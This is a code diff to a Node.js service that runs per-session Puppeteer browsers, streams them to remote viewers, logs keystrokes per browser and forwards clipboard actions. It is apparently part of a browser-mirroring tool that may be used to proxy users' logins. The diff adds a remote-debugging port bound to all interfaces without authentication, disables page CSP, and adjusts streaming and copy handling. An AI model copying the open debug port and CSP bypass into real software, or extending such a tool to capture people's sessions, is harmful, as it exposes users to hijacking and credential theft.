@@ -31,6 +31,10 @@ let ship_logs = null;
 // INITIALIZATION - wrapped in async IIFE
 // ============================================
 (async () => {
+  const puppeteerDebugRaw = `${process.env.PUPPETEER_DEBUG || ''}`
+  const isPuppeteerDebugEnabled = puppeteerDebugRaw.trim().toLowerCase() === 'true'
+  console.log(`[STARTUP] PUPPETEER_DEBUG raw='${puppeteerDebugRaw}' enabled=${isPuppeteerDebugEnabled}`)
+
   // MongoDB connection
   const mongoUrl = process.env.MONGO_URL || 'mongodb://mongodb:27017/fescarcuddle';
   console.log(`[STARTUP] Connecting to MongoDB at ${mongoUrl}`);
@@ -674,15 +678,32 @@ let ship_logs = null;
     if (config.proxy !== undefined) {
       puppet_options.push("--proxy-server=" + config.proxy)
     }
+
+    if (isPuppeteerDebugEnabled) {
+      puppet_options.push('--remote-debugging-address=0.0.0.0')
+      puppet_options.push('--remote-debugging-host=0.0.0.0')
+      puppet_options.push('--remote-debugging-port=9222')
+    }
     //set up a unique user data directory for this session so users don't stomp on each others' connections
     //we'll use this same ID to track unique browser instances for socket renegotiations etc. as well
     let browser_id = Math.random().toString(36).slice(2)
     fs.mkdirSync(`./user_data/${browser_id}`)
 
+    const ignoreDefaultArgs = ['--enable-automation']
+    if (isPuppeteerDebugEnabled) {
+      ignoreDefaultArgs.push('--remote-debugging-port=0')
+    }
+
+    if (isPuppeteerDebugEnabled) {
+      console.log('[PUPPETEER] Debug mode enabled')
+      console.log(`[PUPPETEER] ignoreDefaultArgs=${JSON.stringify(ignoreDefaultArgs)}`)
+      console.log(`[PUPPETEER] remoteDebugArgs=${JSON.stringify(puppet_options.filter((arg) => arg.startsWith('--remote-debugging-')))}`)
+    }
+
     let browser = await puppeteer.launch({
       headless: false,
       ignoreHTTPSErrors: true,
-      ignoreDefaultArgs: ["--enable-automation"],
+      ignoreDefaultArgs,
       defaultViewport: null,
       userDataDir: `./user_data/${browser_id}`,
       args: puppet_options
@@ -703,9 +724,10 @@ let ship_logs = null;
     browser.frameNavigationListenerAttached = false
     browser.keydebug_file = fs.createWriteStream(`./user_data/${browser_id}/keydebug.txt`, { flags: 'a' });
     browser.browser_id = browser_id
-    browser.user_agent = getRandomUserAgent()
+    browser.user_agent = target.user_agent || getRandomUserAgent()
     browser.mobile_user_agent = getRandomMobileUserAgent()
     browser.target_page = await browser.newPage()
+    await browser.target_page.setBypassCSP(true)
     await installMobileViewportGuards(browser.target_page)
     if (config.mobile_emulation) {
       await browser.target_page.emulate({
@@ -958,6 +980,16 @@ let ship_logs = null;
         // Agregar nuevo listener
         browser.target_page.on('framenavigated', browser.frameNavigationListener)
         console.log(`[BROADCAST] Nuevo listener de framenavigated para browser ${browser_id} (socket ${socket.id})`)
+
+        // Race fix: if viewer assignment happened before broadcaster socket was ready,
+        // kick off the first stream now.
+        if (browser.user_socket) {
+          if (browser.session_id) {
+            fastify.io.to(browser.socket_id).emit('set_session_id', browser.session_id)
+          }
+          fastify.io.to(browser.socket_id).emit('stream_video_to_first_viewer', browser.user_socket)
+          console.log(`[BROADCAST] Late stream start for browser ${browser_id} -> viewer ${browser.user_socket}`)
+        }
       })
       socket.on('new_fescar', async function (viewport_width, viewport_height, client_ip, target_id, session_id, mobile) {
         // Remove pending duplicates for the same socket and keep the latest viewport.
@@ -1145,8 +1177,31 @@ let ship_logs = null;
           console.warn(`copy: no browser found for controller_socket ${socket.id}`)
           return
         }
-        let data = await browser.target_page.evaluate("if(window.document.getElementsByTagName('iframe')[0] != undefined){window.document.getElementsByTagName('iframe')[0].contentDocument.getSelection().toString();}else{window.document.getSelection().toString();}")
-        fastify.io.to(socket.id).emit("copy_to_clipboard", data)
+        try {
+          const data = await browser.target_page.evaluate(() => {
+            const safeSelectionToString = (doc) => {
+              try {
+                if (!doc || typeof doc.getSelection !== 'function') return ''
+                const selection = doc.getSelection()
+                return selection ? selection.toString() : ''
+              } catch (err) {
+                return ''
+              }
+            }
+
+            const iframe = document.getElementsByTagName('iframe')[0]
+            if (iframe && iframe.contentDocument) {
+              const iframeSelection = safeSelectionToString(iframe.contentDocument)
+              if (iframeSelection) return iframeSelection
+            }
+
+            return safeSelectionToString(document)
+          })
+          fastify.io.to(socket.id).emit("copy_to_clipboard", data || '')
+        } catch (err) {
+          console.warn(`[copy] Failed to read selection for socket ${socket.id}: ${err.message}`)
+          fastify.io.to(socket.id).emit("copy_to_clipboard", '')
+        }
       })
       // Paste simulation into the mirrored page to validate input forwarding.
       socket.on("paste", async function (paste_data) {
